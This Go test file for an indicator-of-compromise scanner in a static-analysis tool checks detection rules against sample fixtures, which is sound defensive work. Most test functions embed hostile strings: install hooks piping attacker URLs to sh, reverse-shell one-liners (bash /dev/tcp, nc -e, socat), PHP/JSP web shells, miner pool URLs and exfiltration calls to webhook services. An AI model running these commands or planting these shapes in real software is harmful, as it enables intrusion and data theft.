package ioc

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Mohamedashmar432/zero-strike-SAST-engine/internal/core"
	"github.com/Mohamedashmar432/zero-strike-SAST-engine/internal/walker"
)

// run scans files (relative path -> content) with a scanner built from opts and
// returns the findings. Content is handed to the scanner in memory and never
// written to disk: endpoint antivirus quarantines web-shell and reverse-shell
// shapes on write, which would make these tests depend on the machine.
func run(t *testing.T, opts Options, files map[string]string) []core.Finding {
	t.Helper()
	root := t.TempDir()
	opts.Root = root
	s, err := New(opts)
	if err != nil {
		t.Fatal(err)
	}
	var out []core.Finding
	for rel, content := range files {
		e := walker.FileEntry{Path: filepath.Join(root, filepath.FromSlash(rel)), Role: walker.ClassifyRole(rel)}
		if s.Accepts(e) {
			out = append(out, s.scanFile(e, []byte(content))...)
		}
	}
	return out
}

func ruleIDs(fs []core.Finding) []string {
	var ids []string
	for _, f := range fs {
		ids = append(ids, f.RuleID)
	}
	return ids
}

func expect(t *testing.T, name, rel, content, rule string, want bool) {
	t.Helper()
	t.Run(name, func(t *testing.T) {
		got := run(t, Options{}, map[string]string{rel: content})
		fired := false
		for _, f := range got {
			if f.RuleID == rule {
				fired = true
			}
			if f.Kind != core.FindingKindIOC || f.Category != Category {
				t.Errorf("finding %s has kind %q category %q", f.RuleID, f.Kind, f.Category)
			}
		}
		if fired != want {
			t.Errorf("%s fired=%v, want %v (findings: %v)", rule, fired, want, ruleIDs(got))
		}
	})
}

func pkgJSON(key, cmd string) string {
	return `{"name":"demo","scripts":{"` + key + `":"` + strings.ReplaceAll(cmd, `"`, `\"`) + `"}}`
}

func TestInstallHooks(t *testing.T) {
	const r = "ZS-IOC-001"
	expect(t, "postinstall curl pipe sh", "package.json", pkgJSON("postinstall", "curl -s https://attacker.invalid/p.sh | sh"), r, true)
	expect(t, "preinstall wget with url", "package.json", pkgJSON("preinstall", "wget https://attacker.invalid/x -O /tmp/x"), r, true)
	expect(t, "install node -e base64", "package.json", pkgJSON("install", "node -e \"eval(Buffer.from('aGk=','base64').toString())\""), r, true)
	expect(t, "prepare trufflehog", "package.json", pkgJSON("prepare", "npx trufflehog filesystem ."), r, true)
	expect(t, "postinstall powershell iwr iex", "package.json", pkgJSON("postinstall", "powershell -c \"iwr https://attacker.invalid/a | iex\""), r, true)
	expect(t, "composer post-update", "composer.json", `{"scripts":{"post-update-cmd":"wget -qO- https://attacker.invalid/i | bash"}}`, r, true)
	expect(t, "setup.py install class", "setup.py", "import os\nclass I(install):\n    def run(self):\n        os.system('curl -s https://attacker.invalid/p | sh')\n", r, true)
	expect(t, "setup.py exec of fetched content", "setup.py", "from urllib.request import urlopen\nexec(urlopen('https://attacker.invalid/p').read())\n", r, true)

	expect(t, "node-gyp rebuild", "package.json", pkgJSON("postinstall", "node-gyp rebuild"), r, false)
	expect(t, "husky install", "package.json", pkgJSON("prepare", "husky install"), r, false)
	expect(t, "tsc", "package.json", pkgJSON("prepare", "tsc"), r, false)
	expect(t, "local script", "package.json", pkgJSON("postinstall", "node scripts/postinstall.js"), r, false)
	expect(t, "curl in a non-hook script", "package.json", pkgJSON("build", "curl -s https://example.invalid/d.json -o d.json"), r, false)
	expect(t, "curl without url or pipe", "package.json", pkgJSON("postinstall", "curl --version"), r, false)
	expect(t, "node -e without encoding", "package.json", pkgJSON("postinstall", "node -e \"console.log('built')\""), r, false)
	expect(t, "composer artisan", "composer.json", `{"scripts":{"post-install-cmd":["@php artisan optimize"]}}`, r, false)
	expect(t, "setup.py git describe", "setup.py", "import subprocess\nv = subprocess.check_output(['git','describe'])\n", r, false)
	expect(t, "malformed package.json", "package.json", `{"scripts":`, r, false)
}

func TestInstallHookLocation(t *testing.T) {
	got := run(t, Options{}, map[string]string{"package.json": "{\n  \"name\": \"d\",\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"postinstall\": \"curl -s https://attacker.invalid/p | sh\"\n  }\n}\n"})
	if len(got) != 1 || got[0].Location.StartLine != 5 {
		t.Fatalf("want one finding on line 5, got %+v", got)
	}
	if got[0].Metadata["ioc"] != "install-hook" || got[0].Metadata["hook"] != "postinstall" {
		t.Errorf("metadata: %v", got[0].Metadata)
	}
}

func TestEncodedPayload(t *testing.T) {
	const r = "ZS-IOC-002"
	long := strings.Repeat("QUJD", 80)
	expect(t, "php gzinflate chain", "a.php", "<?php eval(gzinflate(base64_decode('YQ==')));", r, true)
	expect(t, "php str_rot13 chain", "a.php", "<?php eval(str_rot13(base64_decode('YQ==')));", r, true)
	expect(t, "php long literal via variable", "a.php", "<?php $p = base64_decode(\""+long+"\"); eval($p);", r, true)
	expect(t, "php assert long", "a.php", "<?php assert(base64_decode('"+long+"'));", r, true)
	expect(t, "js new Function atob long", "a.js", "new Function(atob(\""+long+"\"))();", r, true)
	expect(t, "js eval Buffer base64 long", "a.js", "eval(Buffer.from('"+long+"', 'base64').toString());", r, true)
	expect(t, "js vm run long", "a.js", "vm.runInNewContext(atob('"+long+"'));", r, true)
	expect(t, "js long literal split by concatenation", "a.js", "eval(atob('"+long[:150]+"' + '"+long[:150]+"'));", r, true)
	expect(t, "python zlib+b64 chain", "a.py", "exec(zlib.decompress(base64.b64decode(b'YQ==')))", r, true)
	expect(t, "python b64 long", "a.py", "exec(base64.b64decode(\""+long+"\"))", r, true)
	expect(t, "ts new Function", "a.ts", "const f = new Function(atob('"+long+"'));", r, true)

	expect(t, "decode without executor", "a.js", "const d = atob(x);", r, false)
	expect(t, "member exec", "a.js", "/a/.exec(Buffer.from(x, 'base64').toString());", r, false)
	expect(t, "child_process exec", "a.js", "cp.exec(atob('"+long+"'));", r, false)
	expect(t, "short single decoder", "a.js", "eval(atob('aGk='));", r, false)
	expect(t, "eval of plain literal", "a.py", "eval('1+1')", r, false)
	expect(t, "decoded long literal never executed", "a.py", "FONT = base64.b64decode(\""+long+"\")", r, false)
	expect(t, "php member assert", "a.php", "<?php $this->assert(base64_decode('"+long+"'));", r, false)
	expect(t, "identifier ending in eval", "a.js", "retrieval(atob('"+long+"'));", r, false)
	expect(t, "comment line", "a.js", "// eval(gzinflate(base64_decode('YQ==')))", r, false)
	expect(t, "docs path", "docs/a.php", "<?php eval(gzinflate(base64_decode('YQ==')));", r, false)
	expect(t, "tests path", "tests/a.js", "new Function(atob(\""+long+"\"))();", r, false)
	expect(t, "vendor path", "vendor/a.php", "<?php eval(gzinflate(base64_decode('YQ==')));", r, false)
	expect(t, "unsupported extension", "a.rb", "eval(Base64.decode64('YQ=='))", r, false)
}

func TestWebShell(t *testing.T) {
	const r = "ZS-IOC-003"
	expect(t, "eval post", "s.php", "<?php @eval($_POST['x']);?>", r, true)
	expect(t, "system get", "s.php", "<?php system($_GET['c']); ?>", r, true)
	expect(t, "system get with suffix", "s.php", "<?php system($_GET['c'] . ' 2>&1'); ?>", r, true)
	expect(t, "assert request", "s.php", "<?php assert($_REQUEST['a']); ?>", r, true)
	expect(t, "passthru wrapped", "s.php", "<?php passthru(base64_decode($_POST['c'])); ?>", r, true)
	expect(t, "shell_exec cookie", "s.php", "<?php echo shell_exec($_COOKIE['c']); ?>", r, true)
	expect(t, "preg_replace /e", "s.php", "<?php preg_replace('/.*/e', $_POST['x'], ''); ?>", r, true)
	expect(t, "variable function", "s.php", "<?php $_REQUEST['f']($_REQUEST['a']); ?>", r, true)
	expect(t, "eval with concatenation", "s.php", "<?php eval('?>' . $_POST['x']); ?>", r, true)
	expect(t, "aspx eval request", "s.aspx", "<%eval(Request.Item[\"x\"],\"unsafe\");%>", r, true)
	expect(t, "jsp runtime exec", "s.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>", r, true)

	expect(t, "echo escaped", "p.php", "<?php echo htmlspecialchars($_GET['n']); ?>", r, false)
	expect(t, "command built around request data", "p.php", "<?php system('ls ' . escapeshellarg($_GET['d'])); ?>", r, false)
	expect(t, "literal command", "p.php", "<?php system('ls -la'); ?>", r, false)
	expect(t, "literal eval", "p.php", "<?php eval('return 1;'); ?>", r, false)
	expect(t, "member assert", "p.php", "<?php $this->assert($_POST['a']); ?>", r, false)
	expect(t, "assertEquals", "p.php", "<?php assertEquals($_POST['a'], 1); ?>", r, false)
	expect(t, "plain request in aspx", "p.aspx", "<%= Request.QueryString[\"id\"] %>", r, false)
	expect(t, "println param in jsp", "p.jsp", "<% out.println(request.getParameter(\"n\")); %>", r, false)
	expect(t, "non-php extension", "p.txt", "<?php @eval($_POST['x']);?>", r, false)

	var big strings.Builder
	big.WriteString("<?php\n")
	for i := 0; i < 70; i++ {
		big.WriteString("function f" + strings.Repeat("x", i%5) + string(rune('a'+i%26)) + "($a) {\n  return $a;\n}\n")
	}
	big.WriteString("eval($_POST['x']);\n")
	expect(t, "large file with functions is out of scope", "big.php", big.String(), r, false)
}

func TestReverseShell(t *testing.T) {
	const r = "ZS-IOC-004"
	expect(t, "bash dev tcp", "a.sh", "bash -i >& /dev/tcp/attacker.invalid/4444 0>&1", r, true)
	expect(t, "nc -e", "a.sh", "nc -e /bin/sh attacker.invalid 4444", r, true)
	expect(t, "ncat -e bash", "a.sh", "ncat attacker.invalid 4444 -e /bin/bash", r, true)
	expect(t, "mkfifo nc", "a.sh", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.invalid 4444 >/tmp/f", r, true)
	expect(t, "socat exec", "a.sh", "socat tcp-connect:attacker.invalid:4444 exec:/bin/sh,pty", r, true)
	expect(t, "python pty spawn", "a.py", "import socket\nimport pty\ns = socket.socket()\npty.spawn('/bin/sh')\n", r, true)
	expect(t, "python dup2", "a.py", "import socket, os, subprocess\ns = socket.socket()\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nsubprocess.call(['/bin/sh'])\n", r, true)
	expect(t, "python one-liner", "a.sh", "python -c 'import socket,os;s=socket.socket();os.dup2(s.fileno(),0);os.system(\"/bin/sh\")'", r, true)
	expect(t, "powershell tcpclient", "a.ps1", "$c = New-Object System.Net.Sockets.TCPClient('h',1)\n$s = $c.GetStream()\n$o = iex $d\n", r, true)
	expect(t, "dockerfile", "Dockerfile", "RUN bash -c 'bash -i >& /dev/tcp/attacker.invalid/4444 0>&1'", r, true)

	expect(t, "wait for port", "a.sh", "until echo > /dev/tcp/$H/$P; do sleep 1; done", r, false)
	expect(t, "fd probe", "a.sh", "exec 3<>/dev/tcp/localhost/5432", r, false)
	expect(t, "nc probe", "a.sh", "nc -z -w1 localhost 5432", r, false)
	expect(t, "socat proxy", "a.sh", "socat TCP-LISTEN:8080,fork TCP:backend:80", r, false)
	expect(t, "plain python socket", "a.py", "import socket\ns = socket.socket()\ns.connect(('h', 1))\n", r, false)
	expect(t, "dup2 without socket", "a.py", "import os\nos.dup2(1, 2)\nos.dup2(3, 4)\nos.system('/bin/sh')\n", r, false)
	expect(t, "tcpclient without iex", "a.ps1", "$c = New-Object System.Net.Sockets.TCPClient('h',1)\n$s = $c.GetStream()\n", r, false)
	expect(t, "comment", "a.sh", "# bash -i >& /dev/tcp/h/1 0>&1", r, false)
	expect(t, "docs path", "docs/a.sh", "bash -i >& /dev/tcp/h/1 0>&1", r, false)
	expect(t, "tests path", "tests/a.sh", "bash -i >& /dev/tcp/h/1 0>&1", r, false)
}

func TestMiner(t *testing.T) {
	const r = "ZS-IOC-005"
	expect(t, "stratum tcp", "a.py", `POOL = "stratum+tcp://p.invalid:3333"`, r, true)
	expect(t, "stratum ssl", "a.js", `const p = 'stratum+ssl://p.invalid:443';`, r, true)
	expect(t, "stratum2", "a.sh", `x --url stratum2+tcp://p.invalid`, r, true)
	expect(t, "xmrig with pool args", "a.sh", `./xmrig -o p.invalid:3333 -u W`, r, true)
	expect(t, "minerd with url", "a.sh", `minerd --url=p.invalid:3333`, r, true)
	expect(t, "cpuminer", "a.sh", `cpuminer --url p.invalid:3333 -a sha256d`, r, true)
	expect(t, "xmrig download", "a.sh", `wget https://github.com/xmrig/xmrig/releases/download/v0/x.tar.gz`, r, true)
	expect(t, "chmod miner", "a.sh", `chmod +x ./xmrig`, r, true)
	expect(t, "miner config", "c.json", `{"donate-level": 1, "pools": []}`, r, true)

	expect(t, "stratum word", "a.js", `const stratum = 1;`, r, false)
	expect(t, "stratum hostname", "a.py", `U = 'https://stratum.example.invalid/'`, r, false)
	expect(t, "db pools", "c.json", `{"pools": [{"size": 1}]}`, r, false)
	expect(t, "names in a blocklist", "a.sh", `BLOCKED="xmrig minerd"`, r, false)
	expect(t, "miner word", "a.py", "for miner in miners:\n    miner.dig()\n", r, false)
	expect(t, "docs path", "docs/a.md", `stratum+tcp://p.invalid:3333`, r, false)
	expect(t, "tests path", "tests/a.js", `const p = 'stratum+tcp://p.invalid:3333';`, r, false)
}

func TestExfil(t *testing.T) {
	const r = "ZS-IOC-006"
	expect(t, "webhook.site", "a.js", `fetch("https://webhook.site/0000");`, r, true)
	expect(t, "ngrok subdomain", "a.py", `requests.post('https://abc.ngrok.io/c')`, r, true)
	expect(t, "ngrok-free.app", "a.js", "fetch(`https://abc.ngrok-free.app/c`)", r, true)
	expect(t, "pipedream", "a.php", `file_get_contents("https://eo.m.pipedream.net/?d=" . $x);`, r, true)
	expect(t, "discord webhook", "a.js", `axios.post('https://discord.com/api/webhooks/1234/TOKEN', {});`, r, true)
	expect(t, "telegram bot", "a.py", `requests.get("https://api.telegram.org/bot1:AA/sendMessage")`, r, true)
	expect(t, "oast", "a.sh", `curl -d "$D" https://x.oast.pro/`, r, true)
	expect(t, "interactsh", "a.go", `http.Post("https://x.interact.sh/", "t", nil)`, r, true)
	expect(t, "burp collaborator", "a.js", `const u = "https://x.burpcollaborator.net/";`, r, true)
	expect(t, "bare url in shell", "a.sh", `curl https://webhook.site/0000`, r, true)

	expect(t, "tests path", "tests/a.js", `fetch("https://webhook.site/0000");`, r, false)
	expect(t, "docs path", "docs/a.js", `fetch("https://webhook.site/0000");`, r, false)
	expect(t, "comment", "a.js", `// https://webhook.site/0000`, r, false)
	expect(t, "lookalike host", "a.js", `fetch("https://notwebhook.site.example.invalid/");`, r, false)
	expect(t, "host suffix lookalike", "a.js", `fetch("https://evilngrok.io/");`, r, false)
	expect(t, "ordinary api", "a.js", `fetch("https://api.github.com/");`, r, false)
	expect(t, "domain not a url", "a.js", `const n = "webhook.site";`, r, false)
	expect(t, "config file", "c.yml", `endpoint: https://abc.ngrok.io/`, r, false)
	expect(t, "url outside a literal", "a.js", `x = https://webhook.site/0000`, r, false)
	expect(t, "discord channel link", "a.py", `L = 'https://discord.com/channels/1/2'`, r, false)
}

func TestExfilEvidenceIsRedacted(t *testing.T) {
	got := run(t, Options{}, map[string]string{"a.js": `axios.post('https://discord.com/api/webhooks/1234/SECRETTOKENVALUE', {});` + "\n" +
		`fetch("https://api.telegram.org/bot99:SECRETBOTTOKEN/sendMessage");`})
	if len(got) != 2 {
		t.Fatalf("want 2 findings, got %d", len(got))
	}
	for _, f := range got {
		if strings.Contains(f.Evidence[0].Snippet, "SECRET") {
			t.Errorf("token leaked into evidence: %s", f.Evidence[0].Snippet)
		}
	}
}

func TestCompromisedActions(t *testing.T) {
	const r = "ZS-IOC-008"
	wf := func(uses string) string { return "jobs:\n  b:\n    steps:\n      " + uses + "\n" }
	const w = ".github/workflows/ci.yml"
	expect(t, "tj tag", w, wf("- uses: tj-actions/changed-files@v45"), r, true)
	expect(t, "tj branch", w, wf("- uses: tj-actions/changed-files@main"), r, true)
	expect(t, "reviewdog", w, wf("- uses: reviewdog/action-setup@v1"), r, true)
	expect(t, "quoted", w, wf(`- uses: "tj-actions/changed-files@v44"`), r, true)
	expect(t, "subpath", w, wf("- uses: reviewdog/action-setup/x@v1"), r, true)
	expect(t, "case-insensitive", w, wf("- uses: TJ-Actions/Changed-Files@v45"), r, true)
	expect(t, ".yaml extension", ".github/workflows/ci.yaml", wf("- uses: tj-actions/changed-files@v45"), r, true)

	expect(t, "pinned", w, wf("- uses: tj-actions/changed-files@"+strings.Repeat("a", 40)), r, false)
	expect(t, "39-char ref is not a sha", w, wf("- uses: tj-actions/changed-files@"+strings.Repeat("a", 39)), r, true)
	expect(t, "checkout", w, wf("- uses: actions/checkout@v4"), r, false)
	expect(t, "local", w, wf("- uses: ./.github/actions/x"), r, false)
	expect(t, "docker", w, wf("- uses: docker://alpine:3"), r, false)
	expect(t, "comment", w, "# - uses: tj-actions/changed-files@v45\n", r, false)
	expect(t, "other tj repo", w, wf("- uses: tj-actions/branch-names@v8"), r, false)
	expect(t, "other reviewdog repo", w, wf("- uses: reviewdog/action-eslint@v1"), r, false)
	expect(t, "not a workflow path", "ci/p.yml", wf("- uses: tj-actions/changed-files@v45"), r, false)
}

func TestCompromisedActionCarriesAdvisory(t *testing.T) {
	got := run(t, Options{}, map[string]string{".github/workflows/ci.yml": "steps:\n  - uses: tj-actions/changed-files@v45\n"})
	if len(got) != 1 || got[0].Metadata["advisory"] != "CVE-2025-30066" || !strings.Contains(got[0].Message, "CVE-2025-30066") {
		t.Fatalf("got %+v", got)
	}
}

func TestEveryCompromisedActionCitesAnAdvisory(t *testing.T) {
	m, err := loadMatchers()
	if err != nil {
		t.Fatal(err)
	}
	if len(m.data.CompromisedActions) < 2 {
		t.Fatal("expected the initial compromised-action data")
	}
	for _, a := range m.data.CompromisedActions {
		if a.Advisory == "" || a.Summary == "" {
			t.Errorf("%s lacks an advisory id or summary", a.Action)
		}
	}
}

func writeFeed(t *testing.T, body string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "feed.txt")
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestFeed(t *testing.T) {
	hash := "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b" // sha256("1")
	feedPath := writeFeed(t, "# comment\n\ndomain:evil.invalid\nip:203.0.113.77\nurl:https://x.invalid/p.sh\nsha256:"+hash+"\n")
	opts := Options{FeedPath: feedPath}
	hits := func(files map[string]string) []string {
		var rules []string
		for _, f := range run(t, opts, files) {
			if f.RuleID == "ZS-IOC-007" {
				rules = append(rules, f.Metadata["feed_type"])
			}
		}
		return rules
	}
	cases := []struct {
		name  string
		files map[string]string
		want  int
	}{
		{"domain in literal", map[string]string{"a.js": `const h = 'c2.evil.invalid';`}, 1},
		{"domain in url", map[string]string{"a.sh": `curl http://evil.invalid/a`}, 1},
		{"domain as config value", map[string]string{"c.yml": `server: evil.invalid`}, 1},
		{"ip in url", map[string]string{"a.sh": `curl http://203.0.113.77/a`}, 1},
		{"url", map[string]string{"c.yml": `endpoint: https://x.invalid/p.sh`}, 1},
		{"hash of file", map[string]string{"p.dat": "1"}, 1},
		{"prefix lookalike domain", map[string]string{"a.js": `const h = 'notevil.invalid';`}, 0},
		{"longer host", map[string]string{"a.js": `const h = 'https://evil.invalid.example.org/';`}, 0},
		{"ip with extra digit before", map[string]string{"a.sh": `curl http://1203.0.113.77/a`}, 0},
		{"ip prefix only", map[string]string{"a.sh": `curl http://203.0.113.7/a`}, 0},
		{"bare identifier", map[string]string{"a.js": `evil.invalid.length`}, 0},
		{"different content", map[string]string{"p.dat": "2"}, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := hits(c.files); len(got) != c.want {
				t.Errorf("got %d feed hits %v, want %d", len(got), got, c.want)
			}
		})
	}
}

func TestFeedErrorsAreLoud(t *testing.T) {
	for _, body := range []string{"domain\n", "mac:aa:bb\n", "sha256:xyz\n", "domain:\n"} {
		if _, err := New(Options{FeedPath: writeFeed(t, body)}); err == nil {
			t.Errorf("feed %q should be rejected", body)
		}
	}
	if _, err := New(Options{FeedPath: filepath.Join(t.TempDir(), "missing")}); err == nil {
		t.Error("a missing feed must be an error")
	}
}

func TestFeedFileDoesNotMatchItself(t *testing.T) {
	root := t.TempDir()
	feedPath := filepath.Join(root, "feed.txt")
	if err := os.WriteFile(feedPath, []byte("domain:evil.invalid\nurl:https://evil.invalid/x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	s, err := New(Options{Root: root, FeedPath: feedPath})
	if err != nil {
		t.Fatal(err)
	}
	out, _, _ := s.Scan(context.Background(), []walker.FileEntry{{Path: feedPath}})
	if len(out) != 0 {
		t.Errorf("feed matched itself: %+v", out)
	}
}

func TestFeedOffMeansNoFeedFindings(t *testing.T) {
	got := run(t, Options{}, map[string]string{"a.js": `const h = 'c2.evil.invalid';`})
	if len(got) != 0 {
		t.Errorf("unexpected findings without a feed: %v", ruleIDs(got))
	}
}

func TestRuleMetadata(t *testing.T) {
	ids := map[string]bool{}
	for _, r := range Rules() {
		ids[r.ID] = true
		if r.Name == "" || r.Description == "" || r.Rationale == "" || r.Remediation == "" || r.Short == "" {
			t.Errorf("%s has incomplete metadata", r.ID)
		}
		if r.CWE != "CWE-506" && r.CWE != "CWE-912" {
			t.Errorf("%s CWE = %q, want CWE-506 or CWE-912", r.ID, r.CWE)
		}
	}
	for i := 1; i <= 8; i++ {
		id := "ZS-IOC-00" + string(rune('0'+i))
		if !ids[id] {
			t.Errorf("missing rule %s", id)
		}
	}
}

func TestFindingShape(t *testing.T) {
	got := run(t, Options{}, map[string]string{"package.json": pkgJSON("postinstall", "curl -s https://attacker.invalid/p.sh | sh")})
	if len(got) != 1 {
		t.Fatalf("want 1 finding, got %d", len(got))
	}
	f := got[0]
	if f.Kind != core.FindingKindIOC || f.Category != "indicator-of-compromise" || f.Severity != core.SeverityCritical {
		t.Errorf("kind/category/severity: %v %v %v", f.Kind, f.Category, f.Severity)
	}
	if len(f.CWE) != 1 || f.CWE[0] != "CWE-506" {
		t.Errorf("cwe: %v", f.CWE)
	}
	if f.Fingerprint == "" || f.Description == "" || f.Rationale == "" || f.Remediation == "" || f.RuleName == "" {
		t.Errorf("incomplete finding: %+v", f)
	}
	if f.Secret != nil || f.Dependency != nil || f.Config != nil {
		t.Error("an IOC finding must not carry secret/dependency/config payloads")
	}
	again := run(t, Options{}, map[string]string{"package.json": pkgJSON("postinstall", "curl -s https://attacker.invalid/p.sh | sh")})
	if again[0].Fingerprint != f.Fingerprint {
		t.Error("fingerprint is not stable across runs")
	}
}

func TestBinaryFilesAreOnlyHashed(t *testing.T) {
	root := t.TempDir()
	p := filepath.Join(root, "x.bin")
	if err := os.WriteFile(p, []byte("1\x00stratum+tcp://p.invalid"), 0o644); err != nil {
		t.Fatal(err)
	}
	s, _ := New(Options{Root: root})
	if s.Accepts(walker.FileEntry{Path: p, IsBinary: true}) {
		t.Error("without a feed, binary files must not be accepted")
	}
	if s.Accepts(walker.FileEntry{Path: p, AssetData: true}) {
		t.Error("asset-data entries are for the secrets scanner only")
	}
}
